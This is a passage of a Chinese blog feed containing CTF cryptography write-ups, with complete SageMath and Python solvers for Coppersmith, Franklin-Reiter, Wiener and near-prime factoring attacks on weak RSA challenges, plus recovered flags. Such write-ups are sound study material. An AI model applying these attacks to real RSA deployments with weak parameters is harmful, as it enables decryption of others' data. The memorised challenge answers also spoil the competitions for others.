- C2</span><br><span class="line"> </span><br><span class="line">q1 = g1.change_ring(PRZZ)</span><br><span class="line">q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line">h = h.univariate_polynomial()</span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"></span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">64</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># diff = 15325913216714639606</span></span><br></pre></td></tr></table></figure><p><strong>这里的<code>small_root()</code>的参数很重要, X是设置根的上界的, 这个要尽可能的接近根的大小, 这样求解出来的可能性才高. 而beta一般0.4~0.6就行了.</strong></p><p>接下来就是算M了, 这个又是另外一个method - Franklin-Reiter related-message attack</p><h2 id="Franklin-Reiter-related-message-attack"><a href="#Franklin-Reiter-related-message-attack" class="headerlink" title="Franklin-Reiter related-message attack"></a>Franklin-Reiter related-message attack</h2><p>先来看看wiki上怎么说<br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-1cca0e9bc4784a4c87a66851ebbedb15.png" alt="图片.png"><br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-3bb6344f8b434ae284b5e306dad19abb.png" alt="图片.png"><br>通俗一点就是, 当两个明文满足线性关系$M_2 = aM_1+b$的时候,$x - M_2$是两个方程<br>$$<br>g_1(x) = f(x)^e - C_1 \ (mod \ N) \<br>g_2(x) = x^e - C_2 \ (mod \ N)<br>$$<br>的一个公因式, 因此可以利用在多项式的欧几里得算法算出这个公因式$x - M_2$, 也就是我们要算的M</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = PRx.gen() </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + diff)**e - C2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 辗转相除法求公因式</span></span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"></span><br><span class="line">g = g1.monic()</span><br><span class="line"><span class="comment"># g = xn + 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338855507056808173780823100612346393533355160251650215111996263513671265306614427524745781162849613136748611330041590288489365015322686961617690785110909682202890569108842866175345662756188830323253136519607</span></span><br><span class="line">M = -g[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>M算出来了别忘了除一个2^64(一开始为了方便计算所以把m放大了, 还好不影响解题, 以后做的时候要小心为了方便计算导致算不出根来, 所以最后的代码是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">C1 = <span class="number">80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line">C2 = <span class="number">5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line">n = <span class="number">92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line">C1=(C1*<span class="number">2</span>**<span class="number">192</span>)%n</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">n1 = n</span><br><span class="line">PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line"> </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + y)**e - C2</span><br><span class="line"> </span><br><span class="line">q1 = g1.change_ring(PRZZ)</span><br><span class="line">q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line">h = h.univariate_polynomial()</span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"></span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">64</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">x = PRx.gen() </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + diff)**e - C2</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"></span><br><span class="line">g = g1.monic()</span><br><span class="line"></span><br><span class="line">M = -g[<span class="number">0</span>]</span><br><span class="line">h =<span class="built_in">hex</span>(M*inverse_mod(<span class="number">2</span>**<span class="number">64</span>,n))[<span class="number">2</span>:]</span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(h),<span class="number">2</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">int</span>(h[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = HITCTF2020&#123;dde65d8adf22b5e1a0c0c10eff23c24c&#125;¤ÜZ[öã¯WÇîBA6#5~_ò± 0Ç·æî</span></span><br></pre></td></tr></table></figure><blockquote><p>一下子学了两个方法好爽啊, 在看到e很小的时候, 一定要想起coppersmith来.<br>不过这些应该都算是基础的, 特别是coppersmith的使用感觉还有很多很深奥的地方,</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;关于出去玩只能在手机上用Sage Cell Server做题那件事&lt;br&gt;也是好久没写博客了, 刚好学习一下coppersmith attack&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;先把题目放上来吧&lt;/p&gt;
&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="Coppersmith attack" scheme="http://tearsjin.github.io/tags/Coppersmith-attack/"/>
    
  </entry>
  
  <entry>
    <title>wirteup for 2020 祥云杯 Crypto</title>
    <link href="http://tearsjin.github.io/2020/11/23/wirteup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://tearsjin.github.io/2020/11/23/wirteup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2020-11-23T13:29:58.000Z</published>
    <updated>2021-03-14T12:16:27.208Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>只会做密码的菜鸡</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0x01-SimpleRSA"><a href="#0x01-SimpleRSA" class="headerlink" title="0x01 SimpleRSA"></a>0x01 SimpleRSA</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p, q, r = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">n = p * q * r</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = gmpy2.invert(d , phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">print(e, n)</span><br><span class="line">print(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 </span></span><br><span class="line"><span class="string">1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173</span></span><br><span class="line"><span class="string">1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>说实话这题能做出来也是运气好…<br>wiener还没有自己复现过, 一直都是用现成的脚本. 而这次的n是多个素因子的, 之前的脚本不能用了. 本来是想着去学一下怎么复现的, 结果直接找到原题了(祥云杯好像挺多都能找到原题或者是很像的题的</p><p><a href="https://masterpessimistaa.wordpress.com/2017/11/24/asis-finals-ctf-2017-gracias-writeup/">这是找到的原题的wp</a></p><p>直接抄脚本就能算出d了, 所以到底该怎么写wiener呢?</p><blockquote><p>咕咕咕…有空一定学会它!</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2text</span>(<span class="params">Hex</span>):</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">2</span>: Hex = <span class="string">&#x27;0&#x27;</span> + Hex</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [Hex[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2text</span>(<span class="params">Dec</span>):</span>  </span><br><span class="line">    Hex = <span class="built_in">hex</span>(Dec)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hex2text(Hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    m = <span class="number">12345</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    q0 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    list1 = continued_fraction(Integer(e) / Integer(n))</span><br><span class="line">    conv = list1.convergents()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> conv:</span><br><span class="line">        k = i.numerator()</span><br><span class="line">        q1 = i.denominator()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                d = r * q1 + s * q0</span><br><span class="line">                m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">                <span class="keyword">if</span> m1 == m:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        q0 = q1</span><br><span class="line">c = <span class="number">1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452</span></span><br><span class="line">e = <span class="number">1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679</span></span><br><span class="line">n = <span class="number">1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173</span></span><br><span class="line">d = wiener(e,n)</span><br><span class="line">print(dec2text(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-RSAssss"><a href="#0x02-RSAssss" class="headerlink" title="0x02 RSAssss"></a>0x02 RSAssss</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * next_prime(p) * next_prime(q)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">cipher = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">print(n, cipher)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 </span></span><br><span class="line"><span class="string">3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>费马分解! 我怎么会没想到呢, 两个接近的因子就可以用fermat了.<br>这题也是运气好,在<a href="https://www.alpertron.com.ar/ECM.HTM">这个大数分解网站</a>后台跑了两个钟分出两半来了(真的是没注意放后台跑的</p><p>分出的两半:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383</span><br><span class="line">x2 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079</span><br></pre></td></tr></table></figure><p>考虑到<code>np = next_prime(p)</code>所以p和np不会相差太远, 可以有$np = p+a$ 不妨假设<br>$$<br>p&lt;p+a&lt;q&lt;q+b<br>$$</p><p>又因为p,q是随机生成的两个大素数, 他们相等的可能性太低. 而分出的x1, x2(x1&gt;x2)非常接近, 则x1,x2可能有的组合有<br>$$<br>x_1 = p(q+b) \ x_2 = q(p+a)<br>$$<br>或者是<br>$$<br>x_1 = pq \ x_2 = (p+a)(q+b)<br>$$<br>(可能还有没考虑到的?…</p><p>首先尝试第一种组合(直接中了<br>x1和x2相减有<br>$$<br>x = x_1-x_2 = bp-aq<br>$$<br>消元<br>$$<br>p = {x \over b} + {a \over b}q \<br>x_2 ={a \over v}q^2 + aq + {x \over b}q<br>$$</p><p>则可以有关于q的二次方程<br>$$<br>aq^2 + (ab + x)q - bx_2 = 0<br>$$</p><p>因为解是整数, 所以delta应该为完全平方数<br>$$<br>\Delta = (ab + x)^2 + 4abx_2<br>$$</p><p>所以利用这个特点可以爆破出a,b 从而解出q,再而就能有p,q+b , p+a了</p><p>(<del>有一点不明白就是按理来说a,b只有1组?可能是我没考虑周到,跑出来4组a,b, 发现只有第四组跑出来的q是真正的q(其他三组都是kq), 所以直接采用第四组的q和a,b</del></p><p>想明白了! 因为二次项的系数是a, 如果a的因数里面有完全平方数$k^2$, 那么就可能解出kq这个解了! </p><p>求出n的四个素因子之后常规的RSA解密就行了</p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot, gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257</span></span><br><span class="line">x1 = <span class="number">89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383</span></span><br><span class="line">x2 = <span class="number">89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079</span></span><br><span class="line"></span><br><span class="line">x = x1 - x2</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">        delta_sq = (x + a * b) ** <span class="number">2</span> + <span class="number">4</span> * a * b * x2</span><br><span class="line">        delta = iroot(delta_sq, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> delta[<span class="number">1</span>]:</span><br><span class="line">            p1 = (-(a * b + x) + delta[<span class="number">0</span>]) // (<span class="number">2</span> * a)</span><br><span class="line">            p2 = (-(a * b + x) - delta[<span class="number">0</span>]) // (<span class="number">2</span> * a)</span><br><span class="line">            <span class="keyword">if</span> p1 &gt; <span class="number">0</span> <span class="keyword">and</span> gcd(p1, n) != <span class="number">1</span>:</span><br><span class="line">                print(p1, a, b)</span><br><span class="line">            <span class="keyword">if</span> p2 &gt; <span class="number">0</span> <span class="keyword">and</span> gcd(p2, n) != <span class="number">1</span>:</span><br><span class="line">                print(p2, a, b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    result:</span></span><br><span class="line"><span class="string">    59509622824623675050066481062107171504849863374230362259884081452647743246974989796952759980519162117328441285479164180294347299033843912200899999033032168 1 1536</span></span><br><span class="line"><span class="string">    29754811412311837525033240531053585752424931687115181129942040726323871623487494898476379990259581058664220642739582090147173649516921956100449999516516084 2 768</span></span><br><span class="line"><span class="string">    14877405706155918762516620265526792876212465843557590564971020363161935811743747449238189995129790529332110321369791045073586824758460978050224999758258042 4 384</span></span><br><span class="line"><span class="string">    7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021 8 192</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021</span></span><br><span class="line">np = x2 // q</span><br><span class="line">nq = q + <span class="number">192</span></span><br><span class="line">p = np - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (np - <span class="number">1</span>) * (nq - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题算的时候还算轻松的, 猜出组合之后用delta爆破也不是第一次做了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是太菜…能做的就只有简单的…<br>剩下的密码题还有</p><ol><li>more_calc </li><li>Exposure</li><li>easy matrix</li><li>Blowfish</li></ol><h2 id="more-calc"><a href="#more-calc" class="headerlink" title="more_calc"></a>more_calc</h2><blockquote><p>看过了Nu1l的WP, S确实是可以用别的办法算的…这几天一定要把原理搞懂(这个应该不难</p></blockquote><h2 id="Exposure和easy-matrix"><a href="#Exposure和easy-matrix" class="headerlink" title="Exposure和easy matrix"></a>Exposure和easy matrix</h2><p>都是需要用到LLL的知识的…这个真的还没学会 吃了大亏, 格理论真的要好好的去查一查资料了<br>特别是Exposure…论文都查到了!就是因为不会LLL就不会做了(好菜啊</p><blockquote><p>一定要学会LLL!</p></blockquote><h2 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h2><blockquote><p>第一次接触Blowfish, 先暂时放着吧..</p></blockquote><h1 id="真の总结"><a href="#真の总结" class="headerlink" title="真の总结"></a>真の总结</h1><p>很多理论知识还没有学会吧. 真的感觉题目是水的, 自己菜做不出来而已.<br>然后就是关于RSA, 做了这次明白了其实很多时候用到的方法都是已经学过的, 观察题目给的条件的特点, 再想想自己会的方法的特点(费马分两个接近pq, wiener适合特别大的e等等. 这样做的可能会更有思路更快一点</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;只会做密码的菜鸡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;0x01-S</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>wirteup for 2020 新生杯</title>
    <link href="http://tearsjin.github.io/2020/11/12/wirteup-for-2020-%E6%96%B0%E7%94%9F%E6%9D%AF/"/>
    <id>http://tearsjin.github.io/2020/11/12/wirteup-for-2020-%E6%96%B0%E7%94%9F%E6%9D%AF/</id>
    <published>2020-11-12T01:05:28.000Z</published>
    <updated>2021-03-13T03:17:35.393Z</updated>
    
